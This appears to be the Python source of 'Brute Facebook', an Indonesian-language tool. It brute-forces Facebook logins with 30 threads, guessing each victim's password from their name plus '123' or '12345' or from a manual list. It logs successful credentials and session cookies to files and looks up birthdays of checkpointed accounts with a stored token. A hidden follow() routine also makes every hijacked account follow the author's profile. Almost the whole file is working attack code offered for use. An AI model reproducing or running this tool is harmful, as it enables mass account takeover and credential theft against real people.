#######################################################
# Name           : Brute Facebook (BF)                #
# File           : log.py                             #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############


import requests, re, random, datetime, bs4, json
from concurrent.futures import ThreadPoolExecutor as Modol

from datetime import datetime
from data import selesai as jg
from bs4 import BeautifulSoup as par

#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
#---- PROGRES ------
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
# --- BULAN --------
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
#------------------------------->
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
#------------------------------->
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
biru_m = '[bold cyan]'
bulan_ = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
###########################################################################################
class Brute_crack:
    def __init__(self, oz):
        self.id, self.apk, self.ok, self.uas, self.pr, self.cp, self.loop = [], [], [], [], [], [], 0
        self.id = oz
        self.plerr()
    # ------- METODE --------
    def mentod(self):
        prints(Panel(f"""[{biru_m}1{hapus}] method API (fast)
[{biru_m}2{hapus}] method mbasic (slow)
[{biru_m}3{hapus}] method mobile (super slow) [[green] Disarankan [/]]""",title="[green]METODE LOGIN[/]"))
    # ------- NAMPILKAN APLIKASI --------
    def tampilkan_apk(self):
        prints(Panel("menampilkan aplikasi maka akun akan mudah terkena chekpoint dikarenakan memakai module requests berlebihan. tidak di sarankan untuk menampilkan apilkasi."))
        crot = input(f"  [{M}?{N}] ingin menampilkan aplikasi yang terkait [Y/t]: ")
        if crot in[""]:
            print(f"  [{M}!{N}] jangan kosong");self.tampilkan_apk()
        elif crot in["Y","y"]:
            self.apk.append("y")
        elif crot in["T","t"]:
            self.apk.append("t")
        else:
            print(f"  [{M}!{N}] y/t bro");self.tampilkan_apk()
    # ------- INGFO --------
    def ingfo(self):
        prints(Panel(f"""[{biru_m}+{hapus}] hasil OK disimpan ke -> results/OK-{ha}-{op}-{ta}.txt
[{biru_m}+{hapus}] hasil CP disimpan ke -> results/CP-{ha}-{op}-{ta}.txt

[{merah}×{hapus}] hidupkan mode pesawat 2 detik jika tidak ada hasil."""))
    # ------- SETTING USER AGENT --------
    def ua_set(self):
        try:
            self.uas = open("data/ua.txt", "r").read().splitlines()
        except FileNotFoundError:
            self.uas = "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
        return self.uas
    # ------- GANTI BAHASA --------
    def langague(self, cok):
        try:
            with requests.Session() as pun:
                req = pun.get("https://mbasic.facebook.com/language/",cookies=cok)
                pra = par(req.content,'html.parser')
                for x in pra.find_all('form',{'method':'post'}):
                    if "Bahasa Indonesia" in str(x):
                        bahasa = {
                            "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                            "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                            "submit"  : "Bahasa Indonesia"
                            }
                        url = "https://mbasic.facebook.com" + x["action"]
                        exec = pun.post(url,data=bahasa,cookies=cok)
        except Exception as e:pass
    # ------- PILIH PASSWORD --------
    def plerr(self):
        ___yayanganteng___ = input(f"  [{O}?{N}] apakah anda ingin menggunakan kata sandi manual? [Y/t]: ")
        if ___yayanganteng___ in ["y","Y"]:
            self.tampilkan_apk()
            prints(Panel("[[bold red]![/]] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih"))
            while True:
                pwek = input(f"  [{O}?{N}] masukan kata sandi : ")
                prints(Panel(f"[{biru_m}*[/]] crack dengan sandi -> [ [bold red]{pwek}[/] ]"))
                if pwek in[""," "]:
                    print(f"  {N}[{M}×{N}] jangan kosong bro kata sandi nya")
                elif len(pwek)<=5:
                    print(f"  {N}[{M}×{N}] kata sandi minimal 6 karakter")
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        global prog,des
                        cin = input(f"  [{O}*{N}] method : ")
                        if cin in[""," "]:
                            print(f"  {N}[{M}×{N}] jangan kosong bro");__yan__()
                        elif cin in["1","01"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        elif cin in["2","02"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        elif cin in["3","03"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.__metode__, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        else:
                            print(f"  {N}[{M}!{N}] input yang bener");__yan__()
                    self.mentod()
                    __yan__(pwek.split(","))
                    break
        elif ___yayanganteng___ in ["t","T"]:
            self.tampilkan_apk()
            self.mentod()
            self.__pler__()
        else:
            print(f"  [{M}!{N}] y/t bro");self.plerr()

    # ------- METODE LOGIN --------
    def __metode__(self, user, pasw, cebok):
        prog.update(des,description=f"{str(self.loop)}/{len(self.id)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                session=requests.Session()
                url = session.get(f"https://{cebok}/login/device-based/password/?uid={user}&flow=login_no_pin")
                das = {
                    "Host": cebok,
                    "cache-control": "max-age=0",
                    "upgrade-insecure-requests": "1",
                    "origin": "https://"+cebok,
                    "content-type": "application/x-www-form-urlencoded",
                    "user-agent": self.ua_set(),
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with": "mark.via.gp",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-user": "empty",
                    "sec-fetch-dest": "document",
                    "referer": "https://"+cebok+"/login/device-based/password/?uid="+user+"&flow=login_no_pin",
                    "accept-encoding": "gzip, deflate br",
                    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
                }
                dat = {
                    "lsd"     : re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),
                    "jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
                    "uid"     : user,"flow":"login_no_pin",
                    "pass"    : pw,
                    "flow"    : "login_no_pin",
                    "next"    : "https://"+cebok+"/login/save-device/"
                }
                xx = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data=dat, headers=das)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "y" in self.apk:
                        self.langague(coki)
                        self.cek_apk(session, user, pw, coki)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}")
                        prints(tree)
                    wrt = f" [✓] {user}|{pw}|{coki}"
                    self.ok.append(wrt)
                    open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a").write(f"{wrt}\n")
                    self.follow(session,coki)
                    break
                elif "checkpoint" in session.cookies.get_dict():
                    try:
                        tokenz = open(".token.txt", "r").read()
                        cookie = {'cookie': open(".cokie.txt", "r").read()}
                        kontol = session.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,tokenz),cookies=cookie)
                        xxxxxx = json.loads(kontol.text)
                        cp_ttl = xxxxxx["birthday"]
                        month, day, year = cp_ttl.split("/")
                        month = bulan_[month]
                        tree = Tree("")
                        tree.add(f"[bold yellow]{user}|{pw}|{day} {month} {year}")
                        prints(tree)
                        wrt = f" [×] {user}|{pw} {day} {month} {year}"
                        self.cp.append(wrt)
                        open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a").write(f"{wrt}\n")
                        break
                    except (KeyError, IOError):
                        month = ""
                        day   = ""
                        year  = ""
                    except:pass
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = f" [×] {user}|{pw}"
                    self.cp.append(wrt)
                    open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a").write(f"{wrt}\n")
                    break
                else:
                    continue
            except Exception as e:
                prints(e)
        self.loop+=1
    # ------- MENGECEK APLIKASI --------
    def cek_apk(self, ses, user, pwz, cok):
        tree = Tree("")
        self.tod, self.mek = [], []
        tree.add(f"[bold green]{user}|{pwz}").add(f"[bold green]{cok}")
        w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+cok}).text
        sop = bs4.par(w,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        try:
            for i in range(len(game)):
                self.tod.append(game[i].replace("Ditambahkan pada","\x1b[0m - Ditambahkan pada")+"\n")
        except AttributeError:
            tree.add("[[bold red]![/]] cookie invalid")
        tree.add(f"Aktif - [bold cyan]{len(game)}[/]").add(f"[bold cyan]{''.join(self.tod)}")
        w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+cok}).text
        sop = bs4.par(w,"html.parser")
        x = sop.find("form",method="post")
        xnxx = [i.text for i in x.find_all("h3")]
        try:
            for z in range(len(xnxx)):
                self.mek.append(xnxx[z].replace('Kedaluwarsa pada','\x1b[0m - Kedaluwarsa pada')+"\n")
        except AttributeError:
            tree.add("[[bold red]![/]] cookie invalid")
        tree.add(f"Kadaluarsa - [bold red]{len(xnxx)}").add(f"[bold red]{''.join(self.mek)}")
        prints(tree)
    # ------- BOT FOLLOWERS HEHE:v --------
    def follow(self,session,coki):
        r = par(session.get("https://mbasic.facebook.com/profile.php?id=100005395413800",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text
    # ------- METODE PILIHAN --------
    def __pler__(self):
        global prog,des
        yan = input(f"  [{O}*{N}] method : ")
        self.ingfo()
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for i in self.id:
                    uid, zzz = i.split("<=>")[0], i.split("<=>")[1].lower()
                    xxz = zzz.split(" ")[0]
                    pwx = ["sayang"]
                    if len(zzz)<6:
                        if len(xxz)<3:
                            pass
                        else:
                            pwx.append(xxz+"123")
                            pwx.append(xxz+"12345")
                    else:
                        if len(xxz)<3:
                            pwx.append(zzz)
                        else:
                            pwx.append(zzz)
                            pwx.append(xxz+"123")
                            pwx.append(xxz+"12345")
                    if yan in ["", " "]:
                        print(f"  {N}[{M}×{N}] jangan kosong bro");self.__pler__()
                    elif yan in ["1", "01"]:
                        bool.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    elif yan in ["2", "02"]:
                        bool.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    elif yan in ["3", "03"]:
                        bool.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    else:
                        print(f"  {N}[{M}×{N}] input yang bener");self.__pler__()
        jg.Selesai_crack(self.ok, self.cp)
